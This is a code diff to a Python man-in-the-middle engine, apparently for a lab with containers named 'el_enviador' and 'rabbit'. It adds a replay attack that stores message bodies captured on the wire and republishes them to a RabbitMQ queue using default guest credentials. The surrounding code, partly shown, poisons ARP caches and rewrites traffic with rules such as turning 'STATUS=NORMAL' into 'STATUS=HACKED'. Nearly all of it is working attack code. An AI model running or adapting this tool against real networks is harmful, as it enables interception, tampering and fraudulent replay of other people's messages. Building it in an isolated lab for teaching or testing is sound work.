@@ -51,6 +51,10 @@ class MITMEngine:
         self.target_a = os.environ.get("MITM_TARGET_A", "el_enviador")
         self.target_b = os.environ.get("MITM_TARGET_B", "rabbit")
         self.amqp_port = int(os.environ.get("AMQP_PORT", "5672"))
+        self.amqp_host = os.environ.get("AMQP_HOST", "rabbit")
+        self.amqp_queue = os.environ.get("AMQP_QUEUE", "insane_queue")
+        self.amqp_user = os.environ.get("AMQP_USER", "guest")
+        self.amqp_pass = os.environ.get("AMQP_PASS", "guest")
 
         self.lock = threading.Lock()
         self.attack_on = False
@@ -59,8 +63,9 @@ class MITMEngine:
             {"match": "STATUS=NORMAL", "replace": "STATUS=HACKED"},
             {"match": "note=legit", "replace": "note=pwned"},
         ]
-        self.stats = {"seen": 0, "modified": 0}
+        self.stats = {"seen": 0, "modified": 0, "replayed": 0}
         self.events = deque(maxlen=300)
+        self.captured = deque(maxlen=300)  # cuerpos vistos en el cable, para el replay
 
         self.ip_a = self.mac_a = self.ip_b = self.mac_b = self.my_mac = None
         self._poison_stop = threading.Event()
@@ -163,6 +168,7 @@ class MITMEngine:
                 "mode": self.mode,
                 "rules": self.rules,
                 "stats": dict(self.stats),
+                "captured": len(self.captured),
                 "targets": {"a": f"{self.target_a} ({self.ip_a})",
                             "b": f"{self.target_b} ({self.ip_b})"},
             }
@@ -170,6 +176,33 @@ class MITMEngine:
     def recent_events(self):
         with self.lock:
             return list(self.events)
+
+    # ------------------------------------------------------------------
+    # Replay attack: reinyecta a la cola los mensajes capturados
+    # ------------------------------------------------------------------
+    def replay(self, count):
+        with self.lock:
+            bodies = list(self.captured)[-count:] if count > 0 else []
+        if bodies:
+            threading.Thread(target=self._do_replay, args=(bodies,), daemon=True).start()
+
+    def _do_replay(self, bodies):
+        import pika  # import perezoso
+        try:
+            conn = pika.BlockingConnection(pika.ConnectionParameters(
+                host=self.amqp_host, port=self.amqp_port,
+                credentials=pika.PlainCredentials(self.amqp_user, self.amqp_pass)))
+            ch = conn.channel()
+            ch.queue_declare(queue=self.amqp_queue, durable=True)
+            for b in bodies:
+                ch.basic_publish(exchange="", routing_key=self.amqp_queue, body=b,
+                                 properties=pika.BasicProperties(delivery_mode=2))
+                with self.lock:
+                    self.stats["replayed"] += 1
+            conn.close()
+            print(f"[REPLAY] reenviados {len(bodies)} mensajes a la cola", flush=True)
+        except Exception as e:  # noqa: BLE001
+            print(f"[REPLAY] error: {e}", flush=True)
 
     # ------------------------------------------------------------------
     # Sniff + relay (siempre corriendo; procesa solo si attack_on)
@@ -205,10 +238,13 @@ class MITMEngine:
                         del p[IP].len, p[IP].chksum, p[TCP].chksum
                         tampered = True
                 final_msg = _extract_message(bytes(p[Raw].load)) if tampered else None
+                transmitted = final_msg if tampered else msg  # lo que viaja por el cable
                 with self.lock:
                     self.stats["seen"] += 1
                     if tampered:
                         self.stats["modified"] += 1
+                    if transmitted:
+                        self.captured.append(transmitted)
                     self.events.appendleft({
                         "ts": time.strftime("%H:%M:%S"),
                         "original": msg,
